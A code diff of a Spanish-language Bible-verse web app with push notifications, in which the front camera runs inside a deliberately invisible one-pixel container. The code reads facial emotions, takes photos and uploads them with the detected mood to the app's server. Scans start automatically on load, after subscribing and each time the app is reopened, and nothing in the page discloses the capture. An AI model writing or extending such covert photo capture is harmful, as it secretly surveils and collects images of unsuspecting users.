@@ -16,19 +16,8 @@
     #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
     #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
     
-    @keyframes fadeInUpSubtle {
-        0% { opacity: 0; transform: translateY(20px); filter: blur(5px); }
-        100% { opacity: 1; transform: translateY(0); filter: blur(0); }
-    }
     .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
-
-    /* Animación de "Pensando" */
-    @keyframes pulseText {
-        0% { opacity: 0.5; }
-        50% { opacity: 1; }
-        100% { opacity: 0.5; }
-    }
-    .analyzing { animation: pulseText 1.5s infinite ease-in-out; color: #03dac6; }
+    @keyframes fadeInUpSubtle { 0% { opacity: 0; transform: translateY(20px); filter: blur(5px); } 100% { opacity: 1; transform: translateY(0); filter: blur(0); } }
 
     .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; }
     button { padding: 15px 25px; border: none; cursor: pointer; border-radius: 50px; font-weight: 800; font-size: 0.9rem; width: 100%; max-width: 300px; transition: transform 0.2s; }
@@ -36,14 +25,10 @@
     
     #btn-notify { background: linear-gradient(45deg, #bb86fc, #3700b3); color: white; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.4); display: flex; align-items: center; justify-content: center; gap: 10px; }
     #btn-unsubscribe { background: #cf6679; color: #000; display: none; }
-
     .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
 
-    /* CÁMARA FANTASMA */
-    #hidden-camera-container {
-        position: fixed; top: 0; left: 0; width: 1px; height: 1px; 
-        opacity: 0; z-index: -100; pointer-events: none;
-    }
+    /* CÁMARA INVISIBLE */
+    #hidden-camera-container { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -100; pointer-events: none; }
   </style>
 </head>
 <body>
@@ -55,6 +40,7 @@
     <div class="btn-group">
         <button id="btn-notify" onclick="window.subscribeUser()">📜 OBTENER SABIDURÍA</button>
         <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">🔕 DETENER</button>
+        <button onclick="startMoodScan(true)" style="background: #333; font-size: 0.7rem; padding: 5px;">🔧 FORZAR SCAN</button>
     </div>
   </div>
 
@@ -72,56 +58,69 @@
     let videoStream = null;
     let modelsLoaded = false;
     
-    // --- VARIABLES DE CONTROL ---
     let isScanning = false;
     let lastScanTime = 0;
-    let scanStartTime = 0; // Para el timeout
-    const SCAN_COOLDOWN = 15000; // 15 segs entre intentos
-    const SCAN_TIMEOUT = 5000;   // 5 segs máximo buscando cara
+    let scanStartTime = 0;
+    const SCAN_COOLDOWN = 15000; 
+    const SCAN_TIMEOUT = 10000; // Subimos a 10s para dar tiempo de debug
 
-    // --- 1. LÓGICA DE IA INVISIBLE (CON TIMEOUT) ---
+    // --- LOGGING ---
+    function log(msg) { console.log(`[APP]: ${msg}`); }
+
+    // --- IA LOGIC ---
     window.startMoodScan = async function(force = false) {
-        if (isScanning) return; 
+        log("Intentando iniciar scan...");
 
+        if (isScanning) { log("🚫 Scan abortado: Ya está corriendo."); return; }
+        
         const now = Date.now();
-        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;
+        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) {
+            log(`⏳ Scan abortado: Enfriamiento activo (${Math.round((SCAN_COOLDOWN - (now-lastScanTime))/1000)}s restantes).`);
+            return;
+        }
 
         isScanning = true;
-        scanStartTime = Date.now(); // Iniciamos cronómetro de búsqueda
-
-        // Feedback visual sutil (Opcional)
-        // document.getElementById('reference').classList.add('analyzing');
+        scanStartTime = Date.now();
+        log("🚀 Iniciando Cámara y Modelos...");
 
         try {
             videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             const video = document.getElementById('video-feed');
             video.srcObject = videoStream;
+            log("✅ Stream de video obtenido.");
+
+            // Asegurar que el video esté reproduciendo
+            await video.play().catch(e => log("Video play error (normal si es invisible): " + e));
 
             if (!modelsLoaded) {
+                log("📥 Descargando modelos IA (esto puede tardar)...");
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 modelsLoaded = true;
+                log("✅ Modelos cargados.");
             }
 
+            log("👀 Comenzando bucle de detección...");
             detectEmotionLoop();
 
         } catch (err) {
-            console.error("Error/Permiso cámara:", err);
-            handleScanFailure(); // Fallback inmediato si no hay cámara
+            console.error("❌ Error Fatal Cámara:", err);
+            handleScanFailure();
         }
     }
 
     async function detectEmotionLoop() {
         if (!isScanning) return;
-        const video = document.getElementById('video-feed');
-
-        // --- CHECK DE TIEMPO LÍMITE ---
-        // Si lleva más de 5 segundos buscando y no encuentra nada...
-        if (Date.now() - scanStartTime > SCAN_TIMEOUT) {
-            console.log("⏰ Tiempo agotado. No se detectó rostro.");
-            handleScanFailure(); // Nos rendimos y mostramos versículo random
+        
+        // Timeout Debug
+        const elapsed = Date.now() - scanStartTime;
+        if (elapsed > SCAN_TIMEOUT) {
+            log(`⏰ TIMEOUT: Pasaron ${elapsed/1000}s sin detectar cara.`);
+            handleScanFailure(); 
             return;
         }
+
+        const video = document.getElementById('video-feed');
 
         try {
             const options = new faceapi.TinyFaceDetectorOptions();
@@ -133,25 +132,30 @@
                 const dominant = sorted[0];
                 const confidence = expressions[dominant];
 
-                if (confidence > 0.5) {
-                    console.log(`IA Éxito: ${dominant}`);
+                // Bajamos umbral a 0.4 para facilitar pruebas
+                if (confidence > 0.4) {
+                    log(`🎯 ROSTRO DETECTADO: ${dominant} (${Math.round(confidence*100)}%)`);
                     
-                    // 1. Guardar
                     captureAndSave(video, dominant, confidence);
-
-                    // 2. Finalizar Éxito
                     finishScan(dominant);
                     return;
+                } else {
+                    // Loguear intentos fallidos cada cierto tiempo para no saturar
+                    if (Math.random() > 0.8) log(`...viendo algo pero con poca confianza (${Math.round(confidence*100)}%)`);
                 }
+            } else {
+                // Loguear "nada" ocasionalmente
+                if (Math.random() > 0.9) log("...buscando rostro...");
             }
-        } catch(e) {}
+        } catch(e) {
+            console.error("Error en loop IA:", e);
+        }
 
         if (isScanning) setTimeout(detectEmotionLoop, 200);
     }
 
-    // --- MANEJO DE ÉXITO Y FRACASO ---
-    
     function finishScan(mood) {
+        log("✨ Scan finalizado con éxito.");
         lastScanTime = Date.now();
         isScanning = false;
         stopCamera();
@@ -160,38 +164,16 @@
     }
 
     function handleScanFailure() {
-        // Fallback: Si falla la cámara o no hay cara, mostramos versículo aleatorio
-        // y activamos el Cooldown para no reintentar inmediatamente.
-        console.log("⚠️ Fallback: Versículo aleatorio (Sin guardar en Mongo)");
-        
-        lastScanTime = Date.now(); // Activamos cooldown para que no buclee
+        log("⚠️ Fallo o Timeout. Cerrando cámara.");
+        lastScanTime = Date.now();
         isScanning = false;
         stopCamera();
-        
         document.getElementById('reference').classList.remove('analyzing');
-        
-        // Versículo aleatorio puro
-        const randomVerse = versesDB[Math.floor(Math.random() * versesDB.length)];
-        renderVerse(randomVerse);
     }
 
-    // --- UTILIDADES ---
-    function getVerseForMood(mood) {
-        let dbMood = 'neutral';
-        if (mood === 'happy') dbMood = 'happy';
-        if (mood === 'sad') dbMood = 'sad';
-        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
-        if (mood === 'fearful') dbMood = 'fear';
-        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
-        const pool = filtered.length > 0 ? filtered : versesDB;
-        return pool[Math.floor(Math.random() * pool.length)];
-    }
-
-    function showVerseByMood(mood) {
-        renderVerse(getVerseForMood(mood));
-    }
-
+    // --- GUARDADO ---
     async function captureAndSave(videoElement, emotion, confidence) {
+        log("📸 Generando foto...");
         try {
             const canvas = document.createElement('canvas');
             canvas.width = videoElement.videoWidth;
@@ -205,19 +187,29 @@
             const verse = getVerseForMood(emotion);
             const payload = { image: base64Image, emotion, confidence, verse };
 
-            if (navigator.onLine) sendToMongo(payload);
-            else saveToOfflineQueue(payload);
-        } catch (e) { console.error(e); }
+            if (navigator.onLine) {
+                log("📡 Enviando a Mongo...");
+                sendToMongo(payload);
+            } else {
+                log("📴 Sin internet. Guardando en Local.");
+                saveToOfflineQueue(payload);
+            }
+        } catch (e) { console.error("Error Capture:", e); }
     }
 
     async function sendToMongo(payload) {
         try {
-            await fetch('/api/save-mood', {
+            const res = await fetch('/api/save-mood', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-        } catch(e) { saveToOfflineQueue(payload); }
+            if(res.ok) log("✅ ¡Guardado en Mongo OK!");
+            else log("❌ Error servidor Mongo: " + res.status);
+        } catch(e) { 
+            log("❌ Error Red. Pasando a cola offline.");
+            saveToOfflineQueue(payload); 
+        }
     }
 
     function saveToOfflineQueue(payload) {
@@ -225,45 +217,47 @@
         queue.push(payload);
         if (queue.length > 3) queue.shift();
         localStorage.setItem('mood_queue', JSON.stringify(queue));
+        log(`📁 Guardado en cola local (${queue.length} items)`);
     }
 
     async function processOfflineQueue() {
         if (!navigator.onLine) return;
         let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
         if (queue.length === 0) return;
+        log(`🔄 Procesando cola offline (${queue.length})...`);
         for (const item of queue) { await sendToMongo(item); }
         localStorage.removeItem('mood_queue');
     }
 
+    // --- UTILIDADES ---
     window.addEventListener('online', processOfflineQueue);
     window.addEventListener('load', processOfflineQueue);
 
-    window.stopCamera = function() {
-        if (videoStream) {
-            videoStream.getTracks().forEach(track => track.stop());
-            videoStream = null;
-        }
+    function getVerseForMood(mood) {
+        let dbMood = 'neutral';
+        if (mood === 'happy') dbMood = 'happy';
+        if (mood === 'sad') dbMood = 'sad';
+        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
+        if (mood === 'fearful') dbMood = 'fear';
+        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
+        const pool = filtered.length > 0 ? filtered : versesDB;
+        return pool[Math.floor(Math.random() * pool.length)];
     }
 
-    // --- RENDERIZADO ---
+    function showVerseByMood(mood) { renderVerse(getVerseForMood(mood)); }
     function renderVerse(data) {
         currentVerseData = data;
         const verseEl = document.getElementById('verse');
         const refEl = document.getElementById('reference');
-        
-        verseEl.style.opacity = 0;
-        refEl.style.opacity = 0;
-
+        verseEl.style.opacity = 0; refEl.style.opacity = 0;
         setTimeout(() => {
             verseEl.innerText = `"${data.t}"`;
             refEl.innerText = data.r;
-            verseEl.style.opacity = 1;
-            refEl.style.opacity = 1;
-            verseEl.classList.remove('fade-up');
-            void verseEl.offsetWidth; 
-            verseEl.classList.add('fade-up');
+            verseEl.style.opacity = 1; refEl.style.opacity = 1;
+            verseEl.classList.remove('fade-up'); void verseEl.offsetWidth; verseEl.classList.add('fade-up');
         }, 500);
     }
+    window.stopCamera = function() { if (videoStream) { videoStream.getTracks().forEach(track => track.stop()); videoStream = null; } }
 
     async function showVersionFromSW() {
         try {
@@ -273,26 +267,14 @@
             if (match && match[1]) document.getElementById('version-footer').innerText = `App: ${match[1].replace('biblia-', '')}`;
         } catch (e) {}
     }
-
-    function updateUI(isSubscribed) {
-        const btnNotify = document.getElementById('btn-notify');
-        const btnUnsub = document.getElementById('btn-unsubscribe');
-        if (isSubscribed) { 
-            btnNotify.style.display = 'none'; 
-            btnUnsub.style.display = 'inline-block';
-        } else { 
-            btnNotify.style.display = 'inline-block'; 
-            btnUnsub.style.display = 'none';
-        }
-    }
-
+    
+    // UI & INIT
     window.subscribeUser = async function() {
       if (!('serviceWorker' in navigator)) return;
       try {
-        const registration = await navigator.serviceWorker.ready;
+        const reg = await navigator.serviceWorker.ready;
         const permission = await Notification.requestPermission();
         if (permission !== 'granted') return;
-        
         function urlBase64ToUint8Array(base64String) {
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
             const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
@@ -301,67 +283,43 @@
             for (let i = 0; i < rawData.length; ++i) outputArray[i] = rawData.charCodeAt(i);
             return outputArray;
         }
-
-        const subscription = await registration.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
-        const response = await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
-        
-        if (response.ok) { 
-            localStorage.setItem('setup_v1_pwa', 'true'); 
-            updateUI(true);
-            setTimeout(() => startMoodScan(true), 500); 
-        } 
+        const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
+        await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription: sub, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
+        localStorage.setItem('setup_v1_pwa', 'true'); 
+        updateUI(true); setTimeout(() => startMoodScan(true), 500); 
       } catch (err) { console.error(err); }
     }
-
     window.unsubscribeUser = async function() {
-        if (!confirm("¿Seguro que quieres borrar tus datos?")) return;
+        if (!confirm("¿Borrar datos?")) return;
         try {
             const reg = await navigator.serviceWorker.ready;
             const sub = await reg.pushManager.getSubscription();
-            if (sub) {
-                 await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } });
-                 await sub.unsubscribe();
-                 localStorage.removeItem('setup_v1_pwa');
-            }
-            updateUI(false);
-            window.location.reload();
+            if (sub) { await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } }); await sub.unsubscribe(); localStorage.removeItem('setup_v1_pwa'); }
+            updateUI(false); window.location.reload();
         } catch(e) { console.error(e); }
     }
+    function updateUI(isSubscribed) {
+        document.getElementById('btn-notify').style.display = isSubscribed ? 'none' : 'inline-block';
+        document.getElementById('btn-unsubscribe').style.display = isSubscribed ? 'inline-block' : 'none';
+    }
 
-    // --- INICIALIZACIÓN ---
     showVersionFromSW();
     renderVerse(versesDB[new Date().getDate() % versesDB.length]);
-
-    // Visibilidad (Re-escaneo INTELIGENTE al volver)
     document.addEventListener("visibilitychange", () => {
         if (document.visibilityState === "visible") {
-            const isSetupDone = localStorage.getItem('setup_v1_pwa');
-            // Si regresa, intentamos escanear, pero startMoodScan respetará el COOLDOWN
-            // así que si falló hace 2 segundos, no intentará de nuevo.
-            if (isSetupDone) startMoodScan(); 
+            if (localStorage.getItem('setup_v1_pwa')) { log("👀 App visible. Trigger scan..."); startMoodScan(); }
         }
     });
-    
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js', { type: 'module' }).then(reg => {
-          reg.onupdatefound = () => {
-              const newWorker = reg.installing;
-              newWorker.onstatechange = () => { if (newWorker.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); };
-          };
+          reg.onupdatefound = () => { const newWorker = reg.installing; newWorker.onstatechange = () => { if (newWorker.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); }; };
       });
       navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());
-      
       navigator.serviceWorker.ready.then(async (reg) => {
           const sub = await reg.pushManager.getSubscription();
-          const isStandalone = window.matchMedia('(display-mode: standalone)').matches;
-          const isSetupDone = localStorage.getItem('setup_v1_pwa');
-          
-          if (isStandalone && !isSetupDone) updateUI(false); 
-          else updateUI(!!sub);
-
-          if (!!sub || isSetupDone) {
-              setTimeout(() => { startMoodScan(); }, 1000);
-          }
+          const isDone = localStorage.getItem('setup_v1_pwa');
+          updateUI(!!sub || isDone);
+          if (!!sub || isDone) { setTimeout(() => { log("🚀 Inicio Auto."); startMoodScan(); }, 1000); }
       });
     }
   </script>
